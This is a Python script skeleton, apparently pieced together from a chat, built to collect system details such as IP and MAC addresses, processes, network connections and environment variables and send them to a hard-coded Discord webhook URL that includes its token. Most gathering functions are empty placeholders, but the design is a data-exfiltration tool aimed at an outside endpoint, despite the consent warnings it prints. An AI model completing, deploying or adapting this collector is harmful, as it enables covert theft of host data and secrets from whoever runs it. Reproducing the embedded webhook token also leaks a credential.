# 1. ALL IMPORT STATEMENTS
import requests
import platform
import socket
import getpass
import uuid
import json
import datetime
import sys
import psutil
import time
import os
import subprocess
import re

# 2. --- CONFIGURATION ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1367177534910759053/QiSp7KNfrp_3xEAVKa8JgeLiOE_MsMdfvQmOmkmemJo3g426Wk3DXoKqRzsg4wn6bgbJ" # <<< VERY IMPORTANT
TOP_N_PROCESSES = 5
MAX_CONN_DISPLAY = 7
MAX_ROUTES_DISPLAY = 10
# ... other configs if any ...

# 3. ALL HELPER FUNCTIONS (format_bytes, format_seconds)
def format_bytes(bytes_val):
    # ... (full function code) ...
    pass # Placeholder

def format_seconds(seconds):
    # ... (full function code) ...
    pass # Placeholder

# 4. ALL INFORMATION GATHERING FUNCTIONS (get_public_ip, get_mac_address, get_cpu_info, ..., get_environment_variables)
def get_public_ip():
    # ... (full function code) ...
    pass # Placeholder

def get_mac_address():
    # ... (full function code) ...
    pass # Placeholder

# ... (many more get_... functions here) ...

def get_environment_variables():
    # ... (full function code) ...
    pass # Placeholder

# 5. THE gather_all_info() FUNCTION
def gather_all_info():
    print("Gathering ADVANCED system information (this may take several seconds)...")
    # ... (full function code from the previous correct version) ...
    # It should call all the get_... functions and return report, disk_list
    report = {} # Placeholder
    disk_list = [] # Placeholder
    return report, disk_list # Placeholder

# 6. THE send_to_discord() FUNCTION (the one you just posted, with the corrected IF condition)
def send_to_discord(webhook_url, report, disk_list):
    print(f"[SEND_DISCORD_DEBUG] Function started. Webhook: {webhook_url[:30]}...")

    # THIS IS THE CORRECTED CONDITION:
    if webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE" or not webhook_url or "YOUR_DISCORD" in webhook_url.upper(): # Check against PLACEHOLDER
        print("[SEND_DISCORD_DEBUG] CRITICAL ERROR: The 'webhook_url' variable passed to this function is either the placeholder, empty, or contains 'YOUR_DISCORD'.")
        print(f"[SEND_DISCORD_DEBUG] Actual value received: {webhook_url}")
        return False

    # ... (THE REST OF THE send_to_discord FUNCTION YOU PROVIDED, with individual embed sending logic) ...
    print("[SEND_DISCORD_DEBUG] Finished attempting to send all individual embeds.")
    return True


# 7. THE main() FUNCTION
def main():
    print("Gathering ADVANCED and SENSITIVE system information. Ensure full consent.")
    report, disk_data = gather_all_info() # Calls the data gathering

    print(f"\n--- Summary for {report.get('General', {}).get('Host', 'N/A')} ---")
    # ... (rest of summary print statements) ...
    print("--- End Summary ---\n")

    print("Attempting to send report to Discord...")
    if send_to_discord(WEBHOOK_URL, report, disk_data): # Calls the sending function
        print("Script finished (check console for individual send statuses).")
    else:
        print("Script finished with an initial error in send_to_discord (e.g., bad webhook).")

# 8. THE if __name__ == "__main__": BLOCK
if __name__ == "__main__":
    print("*"*70)
    print("!!! EXTREMELY CRITICAL WARNING: HIGHLY INTRUSIVE SCRIPT !!!")
    print("!!! FULLY INFORMED, DOCUMENTED CONSENT IS ABSOLUTELY ESSENTIAL !!!")
    print("*"*70 + "\n")

    # Ensure the global WEBHOOK_URL is correctly set at the top of this file!
    if WEBHOOK_URL == "YOUR_ACTUAL_DISCORD_WEBHOOK_URL_HERE" or "YOUR_DISCORD" in WEBHOOK_URL.upper(): # Final check
        print("FATAL: The global WEBHOOK_URL at the top of the script is not set correctly!")
        print("Please replace 'YOUR_ACTUAL_DISCORD_WEBHOOK_URL_HERE' with your real webhook.")
        sys.exit(1)

    main()
